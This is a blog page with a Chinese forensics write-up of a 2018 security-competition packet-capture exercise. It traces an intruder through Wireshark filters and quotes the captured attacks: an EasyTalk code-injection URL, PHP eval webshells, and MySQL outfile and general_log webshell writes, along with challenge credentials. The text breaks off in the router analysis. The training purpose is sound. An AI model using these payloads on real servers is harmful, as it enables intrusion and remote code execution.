@@ -1,0 +1,583 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/xuexi.png">
+  <link rel="icon" type="image/png" href="/img/xuexi.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  <title>2018-5-18-铁人三项赛数据赛数据包分析 - Hexo</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.4.0/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"mengsec.com","root":"/","version":"1.8.7","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"onlypost":false},"web_analytics":{"enable":false,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}}};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.3.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>MengChen's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/links/">
+                <i class="iconfont icon-link-fill"></i>
+                友链
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" href="javascript:">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/default.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="2018-5-18-铁人三项赛数据赛数据包分析">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2018-12-04 13:17" pubdate>
+        2018年12月4日 下午
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      3.4k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      47
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">2018-5-18-铁人三项赛数据赛数据包分析</h1>
+            
+            <div class="markdown-body">
+              <p>5月18号 信息安全铁人三项赛分区赛数据包分析练习</p>
+<a id="more"></a>
+
+<h2 id="1-数据包下载链接"><a href="#1-数据包下载链接" class="headerlink" title="1. 数据包下载链接"></a>1. 数据包下载链接</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">链接：https:<span class="hljs-regexp">//</span>pan.baidu.com<span class="hljs-regexp">/s/</span><span class="hljs-number">1</span>KvA2SBuHHPCgYjLA7Q7Ysw  提取码：ifgd <br></code></pre></td></tr></table></figure>
+
+
+<h2 id="2-题目"><a href="#2-题目" class="headerlink" title="2. 题目"></a>2. 题目</h2><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>.黑客的IP是多少<br><span class="hljs-attribute">2</span>.服务器<span class="hljs-number">1</span>.<span class="hljs-number">99</span>的web服务器使用的CMS及其版本号(请直接复制)<br><span class="hljs-attribute">3</span>.服务器拿到的webshell的网址(请输入url解码后的网址)<br><span class="hljs-attribute">4</span>.服务器<span class="hljs-number">1</span>.<span class="hljs-number">99</span>的主机名<br><span class="hljs-attribute">5</span>.网站根目录的绝对路径(注意最后加斜杠)<br><span class="hljs-attribute">6</span>.黑客上传的第一个文件名称是什么<br><span class="hljs-attribute">7</span>.黑客进行内网扫描，扫描的端口都有哪些(端口从小到大，用英文逗号分隔)<br><span class="hljs-attribute">8</span>.服务器<span class="hljs-number">2</span>.<span class="hljs-number">88</span>的ftp服务账号密码(格式：账号/密码)<br><span class="hljs-attribute">9</span>.黑客成功登陆ftp的时间(格式：<span class="hljs-number">10</span>:<span class="hljs-number">15</span>:<span class="hljs-number">36</span>)<br><span class="hljs-attribute">10</span>.黑客在ftp中下载的敏感文件名称是什么<br><span class="hljs-attribute">11</span>.服务器<span class="hljs-number">2</span>.<span class="hljs-number">88</span>中用户名为admin_zz的web后台管理员的密码<br><span class="hljs-attribute">12</span>.服务器<span class="hljs-number">2</span>.<span class="hljs-number">88</span>的mysql账号密码(格式：账号/密码)<br><span class="hljs-attribute">13</span>.服务器<span class="hljs-number">2</span>.<span class="hljs-number">88</span>的mysql服务中有和admin有关的三个表，请按照黑客的查询顺序作答，使用空格分隔<br><span class="hljs-attribute">14</span>.请列出黑客设置的genreal log的绝对路径(将路径复制出来，区分大小写)<br><span class="hljs-attribute">15</span>.路由器的品牌、型号、版本(请直接复制粘贴)<br><span class="hljs-attribute">16</span>.列出路由器的所有IP地址(格式：从小到大，用英文逗号分隔)<br><span class="hljs-attribute">17</span>.在路由器的端口监控中，监控端口和被监控端口分别是多少，例，<span class="hljs-number">1</span>号端口监控<span class="hljs-number">2</span>/<span class="hljs-number">3</span>/<span class="hljs-number">4</span>号端口:<span class="hljs-number">1</span>—&gt;<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span><br><span class="hljs-attribute">18</span>.路由器一共有几个接口?其中有几个WAN口启用?有几个LAN口启用(格式:用英文逗号分隔)<br><span class="hljs-attribute">19</span>.路由器的系统路由表中一共有几条?第三条的子网掩码是多少。例: <span class="hljs-number">255</span> <span class="hljs-number">255</span>.<span class="hljs-number">255</span>.<span class="hljs-number">0</span>则为<span class="hljs-number">24</span> (格式:用英文逗号分隔)<br><span class="hljs-attribute">20</span>.路由器的<span class="hljs-number">5</span>Gwif名称是什么，信道是多少(格式:名称信道)<br></code></pre></td></tr></table></figure>
+
+
+<h2 id="3-数据包分析过程"><a href="#3-数据包分析过程" class="headerlink" title="3. 数据包分析过程"></a>3. 数据包分析过程</h2><p>首先过滤一下<code>HTTP</code>,大致浏览一下，发现有一个可疑的包含<code>phpinfo()</code>的<code>http</code>请求。</p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/1.png" srcset="/img/loading.gif" alt="1"></p>
+<p>追踪一下<code>TCP</code>流，可以看到`phpinfo()被成功执行了。</p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/2.png" srcset="/img/loading.gif" alt="2"></p>
+<p>可以知道黑客的IP为<code>202.1.1.2</code>,受到攻击的主机IP为<code>192.168.1.99</code><br>执行命令的漏洞<code>POC</code>是 </p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Expert</span> Info (Chat/Sequence): GET /index.php/module/action/param<span class="hljs-number">1</span>/%<span class="hljs-number">7</span>B$%<span class="hljs-number">7</span>Bphpinfo()%<span class="hljs-number">7</span>D%<span class="hljs-number">7</span>D HTTP/<span class="hljs-number">1</span>.<span class="hljs-number">1</span>\r\n<br></code></pre></td></tr></table></figure>
+<p><code>tcp.stream eq 509 phpinfo()信息</code></p>
+<p>构造过滤规则<br>接下来要求<code>CMS</code>的版本号,一般来说，网站的版本信息都会在网站的最底部。<br>过滤一下受害主机的响应包。 </p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.src == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">99</span><br></code></pre></td></tr></table></figure>
+
+<p>随便找一个正常的响应包，追踪一下<code>TCP</code>流,在下面可以找到<code>Powered By EasyTalk X2.0.1</code></p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/3.png" srcset="/img/loading.gif" alt="3"></p>
+<p>又要拿到<code>WebShell</code>的网址,从我们找到的<code>POC</code>来看，在请求中携带代码是能够直接执行的。</p>
+<p>构造过滤规则</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;index.php/module/action/param1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">99</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/4.png" srcset="/img/loading.gif" alt="4"></p>
+<p>所以拿到<code>Webshell</code>的网址是</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://202.1.1.1/index.php/module/action/param1/$&#123;@print(eval($_POST</span>[<span class="hljs-string">c</span>]))&#125;<br></code></pre></td></tr></table></figure>
+<p>下一个题目要<code>1.99</code>的主机名。</p>
+<p>一般来说在<code>phpinfo()</code>中，我们能够收集到大量的信息。</p>
+<p>也就是</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>.stream eq <span class="hljs-number">509</span><br></code></pre></td></tr></table></figure>
+<p>追踪一下,将其网页源码保存到本地，使用浏览器打开。<br>可知主机名是</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plain">simplefight1<br></code></pre></td></tr></table></figure>
+
+<p>网站根目录的绝对路径是</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>easytalk/<br></code></pre></td></tr></table></figure>
+<p>要找黑客上传的第一个文件,猜测黑客是利用之前的WebShell来上传的。<br>因此构造过滤规则</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http.request.method</span> == POST <span class="hljs-keyword">and</span> http contains <span class="hljs-string">&quot;/index.php/module/action/param1&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">99</span><br></code></pre></td></tr></table></figure>
+
+<p>使用菜刀上传文件的话，文件一般会被16进制编码，所有可以很容易找到上传文件的请求与响应。</p>
+<p><code>No.280958</code></p>
+<p>请求</p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs awk">Form item: <span class="hljs-string">&quot;z1&quot;</span> = <span class="hljs-string">&quot;L3Zhci93d3cvaHRtbC9lYXN5dGFsay9zY2FuLnBocA==&quot;</span><br><span class="hljs-regexp">/var/</span>www<span class="hljs-regexp">/html/</span>easytalk/scan.php<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/5.png" srcset="/img/loading.gif" alt="5"></p>
+<p>可以知道黑客上传了一个<code>scan.php</code>的文件。</p>
+<p>猜测<code>scan.php</code>正是后面黑客进行内网扫描的工具。<br>构造</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> contains <span class="hljs-string">&quot;scan.php&quot;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">1</span>.<span class="hljs-number">99</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>可知黑客对<br><code>21,80,1433,8080,3306</code>端口进行了扫描<br>追踪一下流</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">tcp</span>.stream eq <span class="hljs-number">849</span><br></code></pre></td></tr></table></figure>
+<p>有内网探测结果,但是不全。估计是在下一个流量包中，没有扫描完毕。<br>根据下一个题目过滤一下<code>FTP</code><br>没有任何结果。</p>
+<p>打开第二个数据包</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ftp</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/7.png" srcset="/img/loading.gif" alt="7"></p>
+<p>可以找到ftp登录成功的数据记录，账号/密码为</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">administrator</span>/<span class="hljs-number">123456</span><br></code></pre></td></tr></table></figure>
+<p>登录时间为</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">14</span>:<span class="hljs-number">07</span>:<span class="hljs-number">15</span><br></code></pre></td></tr></table></figure>
+
+<p>直接追踪一下<code>FTP</code>登录成功后的数据流，可以看到黑客执行的命令，但并没有下载文件。</p>
+<p>打开第三个数据包</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">ftp</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure>
+<p>直接追踪<code>TCP</code>流<br><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/8.png" srcset="/img/loading.gif" alt="8"></p>
+<p>可以看到，黑客下载了<code>config_db.php</code>这个文件</p>
+<p>直接使用<code>ftp-data</code>过滤，可以找到<code>config_db.php</code>的内容<br><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/9.png" srcset="/img/loading.gif" alt="9"></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">​    con_db_host = &quot;localhost&quot;</span><br><span class="hljs-comment">​    con_db_id   = &quot;root&quot;</span><br><span class="hljs-comment">​    con_db_pass	= &quot;S1mp13zz&quot;</span><br><span class="hljs-comment">​    con_db_name = &quot;met&quot;</span><br><span class="hljs-comment">​    tablepre    =  &quot;met_&quot;</span><br><span class="hljs-comment">​    db_charset  =  &quot;utf8&quot;;</span><br><span class="hljs-comment">*/</span><br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+<p>要想获取<code>We</code>b管理员<code>admin_zz</code>的密码。从登录流程和数据库下手。</p>
+<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">http</span> <span class="hljs-keyword">contains</span> admin_zz<br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/10.png" srcset="/img/loading.gif" alt="10"></p>
+<p>追踪一下<code>TCP</code>流</p>
+<p>根据响应的重定向<code>url</code></p>
+<figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">Location: http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">2.88</span><span class="hljs-regexp">/admin/i</span>ndex.php?lang=cn&amp;n=ui_set&amp;pageset=<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>可以认为黑客成功登录了网站后台。</p>
+<p>后面一题问的是<code>2.88</code>的<code>MySQL</code>账号密码，从<code>config_db.php</code>可以获得。</p>
+<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">localhost</span>/S<span class="hljs-number">1</span>mp<span class="hljs-number">13</span>zz<br></code></pre></td></tr></table></figure>
+<p>直接过滤<code>MySQL</code>数据,可以发现有<code>192.168.1.99</code>对<code>192.168.2.88</code>的查询请求，追踪一下<code>TCP</code>流。<br>只看请求：</p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/11.png" srcset="/img/loading.gif" alt="11"></p>
+<p>所以黑客执行了</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">select</span> @@version_comment <span class="hljs-keyword">limit</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">show</span> databases<br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">DATABASE</span>()<br><span class="hljs-keyword">show</span> <span class="hljs-keyword">tables</span><br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> met_admin_array<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> met_admin_column<br><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> met_admin_table<br></code></pre></td></tr></table></figure>
+<p>因此13题答案是</p>
+<figure class="highlight autohotkey"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autohotkey"><span class="hljs-built_in">met_admin_array,</span>met_admin_column,met_admin_table<br></code></pre></td></tr></table></figure>
+<p>尝试<code>mysql contains genreal</code>,没有发现。</p>
+<p>打开第四个数据包使用上述过滤规则也没有发现。。</p>
+<p>直接查看一下<code>MySQL</code>数据吧、</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">mysql</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">2</span>.<span class="hljs-number">88</span><br></code></pre></td></tr></table></figure>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/12.png" srcset="/img/loading.gif" alt="12"></p>
+<p>可以知道黑客又重新登录了一次，两个<code>TCP</code>流分别进行追踪。</p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/13.png" srcset="/img/loading.gif" alt="13"></p>
+<p>黑客尝试直接利用<code>MySQL</code>写马。</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">select &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27; into outfile &#x27;c:/phpStudy/WWW/aaa.php&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>但是报错了</p>
+<figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs smali">The MySQL server is running with the --secure-file-priv option so it cannot<span class="hljs-built_in"> execute </span>this statement<br></code></pre></td></tr></table></figure>
+<p>看后面黑客查询并开启了<code>general log</code></p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log</span>=<span class="hljs-string">&#x27;on&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>下一个<code>TCP</code>流。<br><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/14.png" srcset="/img/loading.gif" alt="14"></p>
+<p>可以看到黑客修改了<code>log</code>路径</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros"><span class="hljs-builtin-name">set</span> global <span class="hljs-attribute">general_log_file</span>=<span class="hljs-string">&#x27;c:/phpStudy/WWW/config/config.php&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>然后执行</p>
+<figure class="highlight php-template"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php-template"><span class="xml">select &#x27;</span><span class="php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[a]);<span class="hljs-meta">?&gt;</span></span><span class="xml">&#x27;</span><br></code></pre></td></tr></table></figure>
+<p>来写马</p>
+<p>后面是路由器的流量分析，没接触过。。</p>
+<p>不过路由器一般是作为网关的而且一般都有一个<code>Web</code>管理界面。<br>当务之急是找到网关<code>IP</code>,</p>
+<p>直接过滤一下<code>arp</code>。</p>
+<p><img src="https://image.mengsec.com/2018.5.18-%E9%93%81%E4%BA%BA%E4%B8%89%E9%A1%B9%E8%B5%9B%E6%95%B0%E6%8D%AE%E8%B5%9B%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/15.png" srcset="/img/loading.gif" alt="15"></p>
+<p>这就得到了网关<code>IP 192.168.0.1</code></p>
+<p>尝试过滤</p>
+<figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs armasm"><span class="hljs-symbol">http</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">ip</span>.<span class="hljs-keyword">addr</span> == <span class="hljs-number">192</span>.<span class="hljs-number">168</span>.<span class="hljs-number">0</span>.<span class="hljs-number">1</span><br></code></pre></td></tr></table></figure>
+<p>没有发现</p>
+<p>尝试在其他数据包查找,<br>在第一个数据包中找到了<code>1.99</code>对<code>0.1</code>的http访问流量<br>要对路由器进行管理的话，一般是需要登录一下的，管理界面是在登录之后，往后找找</p>
